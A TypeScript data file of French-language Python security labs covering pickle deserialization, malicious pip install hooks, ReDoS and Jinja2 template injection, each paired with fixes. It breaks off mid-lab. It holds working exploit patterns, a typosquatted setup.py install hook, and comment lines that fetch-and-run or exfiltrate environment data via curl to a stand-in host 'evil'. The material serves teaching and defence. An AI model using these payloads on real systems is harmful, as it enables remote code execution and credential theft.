// M04 — Python (outillage). Labs Code Noir "A→Z" exécutables.
// Arc pédagogique par technique : comprendre → reproduire → observer → corriger → vérifier.
// Cibles privilégiées : navigateur (Pyodide, stdlib seulement, SANS réseau ni pip)
// quand c'est possible ; "read"/"docker-bash" pour ce qui touche pip/registres/réseau.
//
// IMPORTANT cadre légal : ces labs sont des reproductions ISOLÉES sur ta propre machine /
// dans le sandbox. Forger un payload, publier un paquet piégé ou squatter un nom
// pour viser un système tiers est une infraction pénale. Offensif = labs / scope écrit.

import type { CodeNoirStepsByTechnique } from "./types";

export const stepsM04: CodeNoirStepsByTechnique = {
  // ============================================================
  // 1) python-unsafe-deserialization
  //    pickle.loads / __reduce__ + le fix JSON. 100% Pyodide.
  // ============================================================
  "python-unsafe-deserialization": [
    {
      n: 1,
      title: "Comprendre : pickle est un format de programme",
      goal: "Saisir pourquoi pickle.loads peut exécuter du code, contrairement à JSON.",
      explain:
        "On croit que `pickle` est « le JSON binaire de Python ». **Faux.** JSON décrit des *données* (objets, listes, nombres, strings). `pickle` décrit un *programme de reconstruction* : la chaîne picklée contient des **opcodes** qui disent à l'interpréteur *quels callables appeler avec quels arguments* pour rebâtir l'objet.\n\nLe point dangereux : quand une classe définit la méthode spéciale `__reduce__`, **c'est elle** qui dicte comment l'objet est reconstruit. `__reduce__` retourne un tuple `(callable, args)` que `pickle.loads` **exécute** pendant la désérialisation. Donc `pickle.loads(donnée_attaquant)` = `attaquant_choisit_le_callable()`.\n\n👉 Conséquence : **toute** donnée picklée venue du réseau (cookie, body, message de queue, fichier `.pkl`/`.pt` téléchargé) est du code à exécuter. C'est non-sécurisable par conception.\n\n**Cadre légal : reproduction isolée uniquement.** Ne dépickle jamais une donnée tierce hors lab.",
      target: "read",
    },
    {
      n: 2,
      title: "Reproduire le cas sain : pickle round-trip légitime",
      goal: "Voir pickle fonctionner normalement sur une donnée de confiance.",
      explain:
        "D'abord la base : `pickle.dumps` sérialise un objet, `pickle.loads` le reconstruit. Sur une donnée que **tu** as produite, rien d'anormal. Le problème n'est pas pickle en soi — c'est `loads` sur une donnée que tu **ne contrôles pas**.",
      target: "browser-python",
      code: 'import pickle, base64\n\n# Donnée de confiance (produite par nous) :\noriginal = {"user": "scory", "role": "admin", "xp": 1500}\n\nblob = pickle.dumps(original)\nb64 = base64.b64encode(blob).decode()\nprint("picklé (base64) :", b64)\n\nrestored = pickle.loads(blob)\nprint("restauré        :", restored)\nprint("identique ?     :", restored == original)',
      expected:
        "Le dict est sérialisé puis restauré à l'identique. `identique ? : True`. Tout va bien... tant que le blob vient de NOUS.",
    },
    {
      n: 3,
      title: "Reproduire l'attaque : __reduce__ qui s'exécute",
      goal: "Forger un payload pickle qui déclenche du code à la désérialisation.",
      explain:
        "On joue l'attaquant côté lab. On crée une classe `Exploit` dont `__reduce__` retourne `(callable, args)`. En conditions réelles le callable serait `os.system('curl evil.com|sh')` ou un reverse shell.\n\n**Mais Pyodide est dans le navigateur : pas de réseau, pas de shell.** On démontre donc le **mécanisme** avec un effet observable et inoffensif : écrire un fichier dans `/tmp` (FS virtuel de Pyodide) et imprimer. Le point crucial : ce code tourne **pendant `pickle.loads`**, alors qu'on n'a fait que « désérialiser des données ».",
      target: "browser-python",
      code: 'import pickle, base64, os\n\n# --- Côté "attaquant" : forge du payload ---\nMARKER = "/tmp/pwned.txt"\n\nclass Exploit:\n    def __reduce__(self):\n        # (callable, (args,)) -> EXÉCUTÉ pendant pickle.loads\n        # En vrai : (os.system, ("curl http://evil.com/x.sh | sh",))\n        # Ici, effet observable sans réseau : on écrit un fichier témoin.\n        # En prod : return (os.system, ("curl http://evil.com/x.sh | sh",))\n        cmd = f"open({MARKER!r}, \'w\').write(\'RCE via __reduce__\')"\n        return (exec, (cmd,))\n\npayload = base64.b64encode(pickle.dumps(Exploit())).decode()\nprint("payload forgé (base64) :", payload[:60], "...")\n\n# --- Côté "serveur naïf" : il croit juste désérialiser une session ---\nprint("fichier témoin existe AVANT ?", os.path.exists(MARKER))\nobj = pickle.loads(base64.b64decode(payload))   # <-- BUG : input non trusté\nprint("fichier témoin existe APRÈS ?", os.path.exists(MARKER))\nprint("contenu :", open(MARKER).read())',
      expected:
        "AVANT : False. APRÈS : True, contenu `RCE via __reduce__`. La simple ligne `pickle.loads(...)` a **exécuté du code arbitraire** — c'est le RCE. En prod ce serait `os.system`/reverse shell.",
    },
    {
      n: 4,
      title: "Observer : lire les opcodes avec pickletools",
      goal: "Voir noir sur blanc l'instruction d'exécution cachée dans le blob.",
      explain:
        "Comment savoir qu'un pickle est piégé ? `pickletools.dis()` désassemble les opcodes **sans exécuter**. On repère l'opcode `REDUCE` (appel d'un callable) et le `GLOBAL`/`STACK_GLOBAL` qui charge `builtins.exec` ou `posix.system`. Un pickle « de données » ne contient jamais ça. C'est l'outil d'analyse forensique (et de revue) de base.",
      target: "browser-python",
      code: 'import pickle, pickletools, os, io\n\nclass Exploit:\n    def __reduce__(self):\n        return (exec, ("x = 1 + 1",))\n\nblob = pickle.dumps(Exploit())\nbuf = io.StringIO()\npickletools.dis(blob, buf)\ndump = buf.getvalue()\nprint(dump)\nprint("--- signaux d\'alerte ---")\nprint("contient GLOBAL exec/system ?", "exec" in dump or "system" in dump)\nprint("contient REDUCE (appel)    ?", "REDUCE" in dump)',
      expected:
        "Le désassemblage montre `GLOBAL 'builtins exec'` puis `REDUCE`. Les deux signaux d'alerte sont `True`. Un pickle légitime de simples données n'a ni `GLOBAL exec/system` ni `REDUCE` suspect.",
    },
    {
      n: 5,
      title: "Corriger : remplacer pickle par JSON",
      goal: "Échanger des données avec un format inerte qui ne peut pas exécuter de code.",
      explain:
        "La parade n°1 : **ne jamais `pickle.loads` une donnée non trustée.** Pour de l'échange de données, on utilise **JSON** (`json.loads`), un format *inerte* : il ne sait construire que des types de base, jamais appeler un callable. Idéalement on ajoute une **validation de schéma** (Pydantic) pour rejeter ce qui n'a pas la forme attendue.\n\nOn rejoue le payload pickle de l'étape 3, mais cette fois le « serveur » attend du JSON. Le payload pickle n'est même pas du JSON valide → rejet propre, **zéro exécution**.",
      target: "browser-python",
      code: 'import json, pickle, base64, os\n\n# Le serveur corrigé n\'accepte QUE du JSON :\ndef load_session(raw_b64: str):\n    raw = base64.b64decode(raw_b64)\n    data = json.loads(raw)            # inerte : aucun callable possible\n    if not isinstance(data, dict) or "user" not in data:\n        raise ValueError("schéma invalide")\n    return data\n\n# 1) Donnée légitime au format JSON -> OK\nok = base64.b64encode(json.dumps({"user": "scory", "role": "admin"}).encode()).decode()\nprint("JSON légitime :", load_session(ok))\n\n# 2) On rejoue le payload pickle malveillant de l\'étape 3 :\nclass Exploit:\n    def __reduce__(self):\n        return (exec, ("open(\'/tmp/should_not_exist\',\'w\').write(\'x\')",))\nbad = base64.b64encode(pickle.dumps(Exploit())).decode()\n\ntry:\n    load_session(bad)\nexcept Exception as e:\n    print("payload pickle rejeté :", type(e).__name__)\nprint("fichier créé malgré tout ?", os.path.exists("/tmp/should_not_exist"))',
      expected:
        "Le JSON légitime passe. Le payload pickle déclenche une exception (JSON invalide) et le fichier n'est **jamais** créé : `False`. Aucune exécution de code n'est possible avec json.loads.",
    },
    {
      n: 6,
      title: "Vérifier : durcir au-delà du format",
      goal: "Connaître les garde-fous résiduels (HMAC, safetensors, Bandit, isolation).",
      explain:
        "Le format JSON règle l'échange de données. Pour les autres surfaces :\n\n1. **Format binaire signé indispensable ?** Signer le blob en **HMAC** et vérifier (`hmac.compare_digest`) **avant** de désérialiser. Protège de la falsification, *pas* d'une clé fuitée — JSON reste préférable.\n2. **Modèles ML** : `torch.load(..., weights_only=True)` (PyTorch ≥ 2) ou format **safetensors** (zéro pickle). Jamais un `.pkl`/`.pt`/`.h5` d'origine inconnue.\n3. **Lint CI** : Bandit `B301` (pickle), `B506` (yaml.load), `B307` (eval) + Semgrep. Alerter sur tout `pickle.loads`/`yaml.load`/`eval` en revue.\n4. **Défense en profondeur** : worker non-root, FS read-only, egress filtré (coupe `curl evil` et reverse shell), seccomp/AppArmor.\n\nVérif HMAC en démo : un blob non signé correctement est rejeté avant désérialisation.",
      target: "browser-python",
      code: 'import hmac, hashlib, json, base64\n\nSECRET = b"cle-serveur-en-env"\n\ndef sign(data: dict) -> str:\n    body = json.dumps(data).encode()\n    sig = hmac.new(SECRET, body, hashlib.sha256).hexdigest()\n    return base64.b64encode(body).decode() + "." + sig\n\ndef verify_then_load(token: str) -> dict:\n    body_b64, sig = token.split(".")\n    body = base64.b64decode(body_b64)\n    expected = hmac.new(SECRET, body, hashlib.sha256).hexdigest()\n    if not hmac.compare_digest(sig, expected):   # AVANT toute désérialisation\n        raise ValueError("signature invalide -> rejet")\n    return json.loads(body)\n\ngood = sign({"user": "scory"})\nprint("token signé OK :", verify_then_load(good))\n\nforged = good[:-1] + ("0" if good[-1] != "0" else "1")  # on altère 1 caractère\ntry:\n    verify_then_load(forged)\nexcept Exception as e:\n    print("token falsifié rejeté :", e)',
      expected:
        "Le token signé est accepté. Le token falsifié (1 caractère changé) échoue à la vérif HMAC et est rejeté AVANT `json.loads`. Combiné à JSON, on ne désérialise que du contenu authentifié.",
    },
  ],

  // ============================================================
  // 2) supply-chain-pip
  //    pip / PyPI : conceptuel + démo locale d'un setup.py qui exécute.
  // ============================================================
  "supply-chain-pip": [
    {
      n: 1,
      title: "Comprendre : pip install = exécuter du code d'un inconnu",
      goal: "Réaliser que l'installation d'un paquet exécute du code arbitraire.",
      explain:
        "Installer un paquet n'est pas « copier des fichiers ». Avec les sdists/`setup.py` (et le build backend PEP 517 des wheels), **du code du mainteneur s'exécute sur ta machine et en CI** au moment de l'install ou du build.\n\nTrois vecteurs :\n\n1. **Typosquatting** — un nom proche d'un paquet populaire : `requsts` ≈ `requests`, `python-dateutil` vs `python3-dateutil`, faux `urllib` vs `urllib3`. Tu te trompes d'une lettre → tu installes le piège.\n2. **Account takeover** — compte PyPI sans 2FA piraté → version backdoorée d'un paquet *légitime* poussée (cf. `ctx`, `ssh-decorate`).\n3. **Dépendance transitive** — tu fais confiance à A, mais A→B→C compromis. Surface énorme.\n\n**Cadre légal : publier un paquet piégé est un délit.** Tout ce lab se fait **en local**, jamais d'upload.",
      target: "read",
    },
    {
      n: 2,
      title: "Reproduire (local) : un setup.py qui s'exécute à l'install",
      goal: "Fabriquer un faux paquet dont le code tourne pendant `pip install`.",
      explain:
        "On crée **localement** un mini-paquet `requsts` (typosquat de `requests`) dont la commande `install` est surchargée pour exécuter du code. En réel ce serait `curl http://evil/?d=$(env|base64)` (exfiltration de `.env`/tokens). Ici, effet **observable et inoffensif** : écrire un fichier témoin dans `/tmp`.\n\n**Cadre légal : ce paquet ne doit JAMAIS être uploadé sur PyPI.** Reste sur disque local.",
      target: "docker-bash",
      code: 'set -e\nWORK=$(mktemp -d)\ncd "$WORK"\nmkdir requsts_pkg && cd requsts_pkg\n\n# Code "malveillant" inoffensif : un témoin dans /tmp (en vrai : exfil curl)\ncat > setup.py <<\'PY\'\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\n\nclass Post(install):\n    def run(self):\n        # EN RÉEL : os.system("curl http://evil/?d=$(env|base64)")\n        with open("/tmp/pip_pwned.txt", "w") as f:\n            f.write("code exécuté pendant pip install\\n")\n        install.run(self)\n\nsetup(\n    name="requsts",          # typosquat de "requests"\n    version="0.0.1",\n    py_modules=[],\n    cmdclass={"install": Post},\n)\nPY\n\necho "Paquet piégé créé dans : $WORK/requsts_pkg"\nls -la\necho "WORK=$WORK" > /tmp/lab_supply_path.txt   # mémoriser pour l\'étape suivante',
      expected:
        "Un dossier `requsts_pkg` avec `setup.py`. La classe `Post` surcharge `install` : son code s'exécutera au `pip install`. Rien n'est encore exécuté à ce stade — juste créé localement.",
    },
    {
      n: 3,
      title: "Observer : installer le paquet déclenche le code",
      goal: "Constater que pip install lance le payload sans rien demander.",
      explain:
        "On installe le paquet local dans un **venv jetable** (jamais en prod, jamais root, jamais avec des secrets exposés). Le simple `pip install .` exécute la classe `Post.run` → le fichier témoin apparaît. C'est exactement le moment où, en réel, tes variables d'env partiraient chez l'attaquant.\n\nSi `pip`/`python3` ne sont pas disponibles dans le conteneur, lis simplement le mécanisme : `pip install` → résolution → build backend → **code mainteneur exécuté**.",
      target: "docker-bash",
      code: 'set -e\nrm -f /tmp/pip_pwned.txt\nWORK=$(cut -d= -f2 /tmp/lab_supply_path.txt)\ncd "$WORK/requsts_pkg"\n\necho "témoin AVANT install :"; [ -f /tmp/pip_pwned.txt ] && echo PRESENT || echo absent\n\npython3 -m venv /tmp/lab_venv\n. /tmp/lab_venv/bin/activate\npip install --quiet . || echo "(pip indisponible : voir l\'explication du mécanisme)"\n\necho "témoin APRÈS install :"; [ -f /tmp/pip_pwned.txt ] && cat /tmp/pip_pwned.txt || echo absent',
      expected:
        "AVANT : absent. APRÈS : le fichier `/tmp/pip_pwned.txt` contient « code exécuté pendant pip install ». Le seul fait d'installer a lancé le code de l'inconnu. En prod = exfiltration silencieuse.",
    },
    {
      n: 4,
      title: "Corriger : --require-hashes + pins exacts",
      goal: "Bloquer toute installation non explicitement autorisée par un hash.",
      explain:
        "Parade centrale : **lockfile + hashes**. Avec `pip install --require-hashes -r requirements.txt`, pip **refuse** d'installer un paquet dont le hash ne correspond pas — et exige un hash + une version *exacte* pour **chaque** dépendance (transitive comprise). Un paquet surgi, une version inattendue, un artefact altéré → build cassé, pas installé.\n\nMême logique avec Poetry/PDM/uv + lockfile committé. Pins exacts (`==`), jamais de plages floues (`>=`).\n\nDémo : un `requirements.txt` avec hash. On verra `pip` refuser dès qu'un hash manque/diverge.",
      target: "docker-bash",
      code: 'set -e\ncd /tmp\n\n# requirements avec hash EXACT (ici un faux hash pour montrer le refus) :\ncat > req-hashed.txt <<\'TXT\'\nrequsts==0.0.1 --hash=sha256:0000000000000000000000000000000000000000000000000000000000000000\nTXT\n\n. /tmp/lab_venv/bin/activate 2>/dev/null || python3 -m venv /tmp/lab_venv && . /tmp/lab_venv/bin/activate\n\necho "--- tentative avec --require-hashes (hash invalide attendu) ---"\npip install --require-hashes -r req-hashed.txt 2>&1 | tail -n 5 || true\n\necho\necho "Règle : sans hash correct ET version exacte, pip REFUSE d\'installer."',
      expected:
        "pip rejette l'installation : le hash ne correspond pas (« THESE PACKAGES DO NOT MATCH THE HASHES »). Aucune install, donc aucun code exécuté. Un attaquant ne peut pas glisser une version/artefact non listé.",
    },
    {
      n: 5,
      title: "Vérifier : audit automatisé + hygiène",
      goal: "Mettre en place la détection continue et les bonnes pratiques restantes.",
      explain:
        "Le hash bloque l'inattendu ; il faut aussi **détecter le connu-vulnérable** et le **comportement suspect** :\n\n1. **`pip-audit` / OSV-Scanner en CI** → casse le build sur une dépendance à CVE connue. **Socket.dev** → flag les comportements suspects (postinstall qui fetch, accès réseau au build).\n2. **2FA obligatoire** sur les comptes PyPI ; pour publier : **Trusted Publishing (OIDC)**, pas de token longue durée.\n3. **Vérifier le nom EXACT** avant install (anti-typosquat) : âge, téléchargements, source.\n4. **Isoler l'install** : venv dédié, CI éphémère sans secrets, **egress filtré** pendant l'install pour bloquer l'exfil.\n5. **Index privé** pour les deps internes (→ technique dependency-confusion), audit régulier de l'arbre transitif.\n\nDémo : lancer `pip-audit` (ou afficher la commande si absent).",
      target: "docker-bash",
      code: 'set -e\n. /tmp/lab_venv/bin/activate 2>/dev/null || true\n\nif python3 -m pip_audit --version >/dev/null 2>&1 || command -v pip-audit >/dev/null 2>&1; then\n  echo "--- pip-audit sur l\'environnement ---"\n  pip-audit || true\nelse\n  echo "pip-audit non installé dans ce lab. En CI tu ferais :"\n  echo "  pip install pip-audit && pip-audit -r requirements.txt"\n  echo "  # ou : osv-scanner -L requirements.txt"\nfi\n\necho\necho "Checklist : --require-hashes | pins == | 2FA+OIDC | egress filtré | nom vérifié"',
      expected:
        "`pip-audit` liste les vulnérabilités connues de l'arbre (ou affiche la commande CI si absent). Couplé aux hashes (étape 4), tu bloques l'inattendu ET le connu-vulnérable.",
    },
  ],

  // ============================================================
  // 3) redos
  //    Regex catastrophique + mesure du temps + fix. 100% Pyodide.
  // ============================================================
  redos: [
    {
      n: 1,
      title: "Comprendre : le backtracking exponentiel",
      goal: "Comprendre pourquoi (a+)+$ explose sur un input non-matchant.",
      explain:
        "Le moteur regex de Python (`re`, comme la plupart) utilise du **backtracking**. Quand un pattern ambigu peut découper l'input de plusieurs façons, le moteur **les essaie toutes** avant de conclure « ça ne matche pas ».\n\n`^(a+)+$` est l'exemple canonique : `(a+)+` peut répartir N caractères `a` en groupes d'une infinité de manières. Tant que la chaîne ne finit **pas** par ce qui est attendu (on ajoute un `X` final), le moteur explore **toutes** les répartitions → `O(2^N)`. 30 `a` + `X` suffisent à figer le worker plusieurs secondes.\n\n**ReDoS** : un seul input piégé sur un endpoint qui applique une regex à de l'input user (email, URL, parsing) gèle le process. `re` est mono-thread et **n'a pas de timeout natif**. Real-world : Cloudflare 2019 (27 min de downtime mondial), Stack Exchange 2016.\n\n**Cadre légal : teste sur tes services / labs uniquement.**",
      target: "read",
    },
    {
      n: 2,
      title: "Reproduire : input court, qui matche",
      goal: "Voir le pattern vulnérable fonctionner normalement et vite.",
      explain:
        "D'abord le cas bénin : si l'input **matche** le pattern, le moteur trouve une solution rapidement et ne backtracke pas. C'est ce qui rend la faille sournoise : en test avec des entrées valides, tout est instantané. Le danger n'apparaît que sur l'entrée **hostile** (étape suivante).",
      target: "browser-python",
      code: 'import re, time\n\nEVIL = re.compile(r"^(a+)+$")\n\nfor n in (5, 10, 20):\n    s = "a" * n                 # input qui MATCHE\n    t0 = time.perf_counter()\n    m = EVIL.match(s)\n    dt = time.perf_counter() - t0\n    print(f"{n:>3} a (match)   -> match={bool(m)}  {dt*1000:.3f} ms")',
      expected:
        "Tous instantanés (< 1 ms) et `match=True`. Avec des entrées valides la regex paraît parfaitement saine — c'est le piège.",
    },
    {
      n: 3,
      title: "Observer : l'explosion sur l'input piégé",
      goal: "Mesurer le temps qui double à chaque caractère ajouté.",
      explain:
        "Maintenant l'input **hostile** : N caractères `a` suivis d'un `X`. Comme la chaîne ne peut **jamais** matcher (le `X` casse `$`), le moteur essaie toutes les répartitions avant d'abandonner. On mesure avec `time.perf_counter()` : le temps **double à chaque `a` ajouté** — signature du `O(2^N)`.\n\n⚠️ On reste à des N modestes (jusqu'à ~26) pour ne pas figer l'onglet : c'est déjà largement suffisant pour voir la courbe exploser.",
      target: "browser-python",
      code: 'import re, time\n\nEVIL = re.compile(r"^(a+)+$")\n\nprint("N (a)  | temps")\nfor n in range(18, 27):              # garder N modeste : ça double à chaque pas\n    s = "a" * n + "X"               # input PIÉGÉ : ne matchera jamais\n    t0 = time.perf_counter()\n    EVIL.match(s)\n    dt = time.perf_counter() - t0\n    print(f"  {n:>4} | {dt*1000:9.1f} ms")\n\nprint("\\nChaque +1 sur N ~double le temps => O(2^N), backtracking catastrophique.")',
      expected:
        "Le temps croît de façon explosive (chaque ligne ~2x la précédente) : quelques ms à N=18, des centaines de ms / secondes vers N=26. C'est le ReDoS : un input minuscule gèle le worker.",
    },
    {
      n: 4,
      title: "Corriger 1 : limiter la longueur avant la regex",
      goal: "Couper l'explosion en bornant l'input en amont.",
      explain:
        "Parade simple et robuste : **valider la longueur AVANT** d'appliquer la regex. Le coût du backtracking dépend de N ; si on rejette tout input > seuil (ex. 200 caractères pour un email), l'explosion ne peut pas démarrer. C'est une défense bon marché à mettre partout, indépendamment du pattern.",
      target: "browser-python",
      code: 'import re, time\n\nEVIL = re.compile(r"^(a+)+$")\nMAX_LEN = 64   # seuil métier raisonnable\n\ndef safe_match(s: str):\n    if len(s) > MAX_LEN:\n        raise ValueError(f"input trop long ({len(s)} > {MAX_LEN}) -> rejet")\n    return EVIL.match(s)\n\nattack = "a" * 5000 + "X"   # aurait figé le worker des heures\nt0 = time.perf_counter()\ntry:\n    safe_match(attack)\nexcept ValueError as e:\n    print("bloqué :", e)\nprint(f"temps : {(time.perf_counter()-t0)*1000:.3f} ms (instantané)")',
      expected:
        "L'input de 5001 caractères est rejeté instantanément (« input trop long ... -> rejet ») sans jamais atteindre la regex. L'explosion n'a pas lieu : < 1 ms.",
    },
    {
      n: 5,
      title: "Corriger 2 : timeout via un moteur sans backtracking",
      goal: "Garantir un temps linéaire, même si la longueur n'est pas bornée.",
      explain:
        "La limite de longueur ne suffit pas toujours (parsing de gros documents légitimes). La parade structurelle : un **moteur sans backtracking**, type **RE2** (`google-re2` en Python, RE2 natif en JS), qui garantit un temps **linéaire** sur n'importe quel input — l'explosion est mathématiquement impossible.\n\n`re2` n'est pas dans Pyodide. On **simule le principe** d'un timeout/garde via une réécriture du pattern : `^a+$` (un seul groupe, non ambigu) est équivalent pour valider « que des a », mais s'exécute en linéaire. La vraie règle : **éviter les quantifieurs imbriqués** `(a+)+`, `(a|aa)+`, les alternances ambiguës — ancrer et être spécifique.",
      target: "browser-python",
      code: 'import re, time\n\n# Pattern réécrit : sémantique équivalente ("que des a"), SANS ambiguïté.\nLINEAR = re.compile(r"^a+$")\n\nprint("N (a+X) | temps avec ^a+$ (linéaire)")\nfor n in (26, 1000, 100000):\n    s = "a" * n + "X"\n    t0 = time.perf_counter()\n    LINEAR.match(s)\n    dt = time.perf_counter() - t0\n    print(f" {n:>6} | {dt*1000:8.3f} ms")\n\nprint("\\nMême sur 100000 caractères : quelques ms. Pas de quantifieur imbriqué = pas d\'explosion.")\nprint("En prod : google-re2 / RE2 garantit ce comportement sur N\'IMPORTE quel pattern.")',
      expected:
        "Avec `^a+$`, même 100000 caractères se traitent en quelques ms : croissance linéaire, pas exponentielle. Le pattern réécrit (ou RE2) supprime le backtracking catastrophique.",
    },
    {
      n: 6,
      title: "Vérifier : auditer ses patterns",
      goal: "Détecter automatiquement les regex vulnérables avant prod.",
      explain:
        "Pour ne pas réintroduire le bug :\n\n1. **Audit outillé** : `safe-regex` (JS), `recheck` (détecte le backtracking exponentiel), règles **Semgrep `p/redos`** / CodeQL.\n2. **Limiter la longueur** systématiquement avant toute regex sur input user.\n3. **RE2** (`google-re2`) pour toute regex appliquée à de l'input hostile → temps linéaire garanti.\n4. **Timeout / isolation** : `re` n'a pas de timeout interne → exécuter une regex user-controlled dans un worker/process séparé avec deadline.\n5. **Réécrire** : bannir `(a+)+`, `(a|aa)+`, alternances ambiguës ; ancrer `^...$`, être spécifique.\n6. **Préférer un parseur** (Pydantic) à une regex maison pour emails/URLs.\n\nDémo : un mini-détecteur heuristique de patterns à risque.",
      target: "browser-python",
      code: 'import re\n\n# Heuristique simple facon "safe-regex" : repere les quantifieurs imbriques.\nNESTED = re.compile(r"[*+}]\\)?[*+]|\\([^)]*[*+][^)]*\\)[*+]")\n\ncandidates = [\n    r"^(a+)+$",            # vulnerable\n    r"^([a-zA-Z0-9]+)*@",  # vulnerable (email maison)\n    r"^a+$",               # sain\n    r"^[a-z0-9._%+-]+@[a-z0-9.-]+$",  # sain\n]\n\nfor pat in candidates:\n    risky = bool(NESTED.search(pat))\n    flag = "RISQUE" if risky else "ok"\n    print(f"[{flag:>6}] {pat}")\n\nprint("\\nEn CI : semgrep --config p/redos, ou recheck/safe-regex, pour automatiser ce contrôle.")',
      expected:
        "Les patterns à quantifieurs imbriqués (`^(a+)+$`, `^([a-zA-Z0-9]+)*@`) sont flaggés RISQUE ; `^a+$` et l'email ancré sont `ok`. À automatiser en CI avec Semgrep/recheck.",
    },
  ],

  // ============================================================
  // 4) ssti-jinja2
  //    Jinja2 absent de Pyodide -> mini-moteur basé sur eval pour montrer
  //    le PRINCIPE (7*7=49 -> accès objets), puis le fix. 100% Pyodide.
  // ============================================================
  "ssti-jinja2": [
    {
      n: 1,
      title: "Comprendre : interpoler l'input DANS la source du template",
      goal: "Distinguer 'passer une variable' de 'construire la source du template'.",
      explain:
        "Un moteur de template (Jinja2/Flask) rend une **source** : `Bonjour {{ name }}`. La bonne pratique passe `name` en **variable** au moment du rendu → `{{ name }}` est *échappé*, jamais évalué.\n\nLe bug SSTI : construire la **source elle-même** avec de l'input user, par concaténation ou f-string :\n```python\nTemplate('Bonjour ' + name).render()         # BUG\nrender_template_string(f'Bonjour {name}')     # BUG\n```\nIci `name` n'est plus une donnée affichée : il devient **du code de template**. Si l'attaquant envoie `{{7*7}}`, le moteur l'**évalue** côté serveur.\n\n**Détection** : injecter `{{7*7}}` → si la réponse contient `49`, le serveur évalue ton input (≠ XSS, c'est côté **serveur**). Escalade : depuis une string vide on remonte `__class__` → `__mro__`/`__subclasses__` → `os`/`subprocess` = **RCE**.\n\n**Pyodide n'embarque pas Jinja2.** On démontre le **mécanisme** avec un mini-moteur maison basé sur `eval` — exactement la même faille de fond : *de l'input devient du code évalué côté serveur*.\n\n**Cadre légal : labs PortSwigger / cibles autorisées uniquement.**",
      target: "read",
    },
    {
      n: 2,
      title: "Reproduire : un mini-moteur de template (eval) vulnérable",
      goal: "Construire un moteur {{ ... }} qui évalue l'expression, comme Jinja2.",
      explain:
        "On écrit un moteur jouet : il remplace chaque `{{ expr }}` par `eval(expr)`. C'est précisément ce que fait un moteur de template — sauf qu'un vrai moteur restreint normalement le contexte. Ici on reproduit le cas **vulnérable** : la source est construite avec l'input user, et les expressions sont évaluées.\n\nCas bénin d'abord : `name` passé comme **donnée**, le moteur l'affiche tel quel. Pas de souci tant que l'input reste une variable.",
      target: "browser-python",
      code: 'import re\n\ndef render(source: str, ctx: dict) -> str:\n    # Remplace {{ expr }} par eval(expr) -> coeur d\'un moteur de template.\n    def repl(m):\n        return str(eval(m.group(1).strip(), {"__builtins__": {}}, ctx))\n    return re.sub(r"\\{\\{(.+?)\\}\\}", repl, source)\n\n# Usage CORRECT : la donnee passe en VARIABLE, pas dans la source.\nsafe_source = "Bonjour {{ name }} !"\nprint(render(safe_source, {"name": "scory"}))',
      expected:
        "Affiche `Bonjour scory !`. Quand l'input est une variable du contexte, le moteur se comporte normalement.",
    },
    {
      n: 3,
      title: "Observer : {{7*7}} -> 49, l'input est évalué",
      goal: "Prouver l'évaluation serveur en injectant une expression arithmétique.",
      explain:
        "Le bug : le serveur **construit la source** avec l'input user (`'Bonjour ' + name`). L'attaquant n'envoie plus un nom mais une **expression de template**. Le test universel de détection SSTI : `{{7*7}}`. Si la sortie contient `49`, l'input est évalué côté serveur — la faille est confirmée.",
      target: "browser-python",
      code: 'import re\n\ndef render(source: str, ctx: dict) -> str:\n    def repl(m):\n        return str(eval(m.group(1).strip(), {"__builtins__": {}}, ctx))\n    return re.sub(r"\\{\\{(.+?)\\}\\}", repl, source)\n\n# BUG : l\'input user est concatene DANS la source du template.\ndef vulnerable_view(user_input: str) -> str:\n    source = "Bonjour " + user_input          # <-- la faille\n    return render(source, {})\n\nprint("input normal :", vulnerable_view("scory"))\nprint("payload SSTI :", vulnerable_view("{{7*7}}"))\nprint("payload SSTI :", vulnerable_view("{{ 7 * 7 }}"))',
      expected:
        "`input normal : Bonjour scory`. Les payloads donnent `Bonjour 49` : l'expression `7*7` a été **évaluée côté serveur**. C'est la signature d'une SSTI confirmée.",
    },
    {
      n: 4,
      title: "Observer l'escalade : de l'éval vers l'accès aux objets",
      goal: "Voir comment {{ }} permet d'atteindre des objets Python, vers la RCE.",
      explain:
        "Une fois l'évaluation acquise, l'attaquant ne s'arrête pas à `49`. En Jinja2 réel, on remonte la hiérarchie d'objets : `''.__class__.__mro__[1].__subclasses__()` → trouver `Popen` → exécuter une commande ; ou `cycler.__init__.__globals__.os.popen('id')`.\n\nDans notre moteur jouet, on a déjà mis `__builtins__: {}` (un mini garde-fou), donc l'import direct est coupé. On démontre quand même l'**escalade de principe** : depuis un objet du contexte, accéder à des **attributs** qu'on n'avait pas prévu d'exposer. Le message clé : *évaluer l'input = donner accès au graphe d'objets Python*.",
      target: "browser-python",
      code: 'import re\n\ndef render(source: str, ctx: dict) -> str:\n    def repl(m):\n        return str(eval(m.group(1).strip(), {"__builtins__": {}}, ctx))\n    return re.sub(r"\\{\\{(.+?)\\}\\}", repl, source)\n\ndef vulnerable_view(user_input: str, ctx: dict) -> str:\n    return render("Profil: " + user_input, ctx)\n\n# Le dev expose un objet "inoffensif" dans le contexte :\nclass Config:\n    SECRET = "cle-prod-super-secrete"\nctx = {"cfg": Config()}\n\nprint(vulnerable_view("{{ cfg }}", ctx))\n# L\'attaquant remonte les attributs depuis l\'objet expose :\nprint(vulnerable_view("{{ cfg.SECRET }}", ctx))\nprint(vulnerable_view("{{ cfg.__class__.__name__ }}", ctx))\nprint("\\nEn Jinja2 reel : \'\'.__class__.__mro__[1].__subclasses__() -> Popen -> RCE.")',
      expected:
        "`{{ cfg.SECRET }}` exfiltre `cle-prod-super-secrete` et `{{ cfg.__class__.__name__ }}` donne `Config`. L'évaluation permet de naviguer dans les attributs des objets — en Jinja2 réel, cette navigation mène jusqu'à `os`/`Popen` = RCE.",
    },
    {
      n: 5,
      title: "Corriger : passer l'input en variable, jamais dans la source",
      goal: "Rendre l'input inerte en le traitant comme donnée échappée.",
      explain:
        "La vraie parade n'est **pas** de filtrer `{{ }}` : c'est de **ne jamais mettre d'input user dans la source du template**. On passe les données en **variables** :\n```python\nrender_template('hello.html', name=name)   # {{ name }} est ECHAPPE, pas evalue\n```\nLe template (source) est **fixe et écrit par le dev** ; l'input n'est qu'une valeur injectée au rendu, traitée comme texte. On rejoue le payload `{{7*7}}` : il s'affiche **littéralement**, jamais évalué.\n\nRègle complémentaire : **la logique vit hors du template**. Le template affiche, il ne calcule pas. Aucun f-string/concat construisant du markup template avec de l'entrée externe.",
      target: "browser-python",
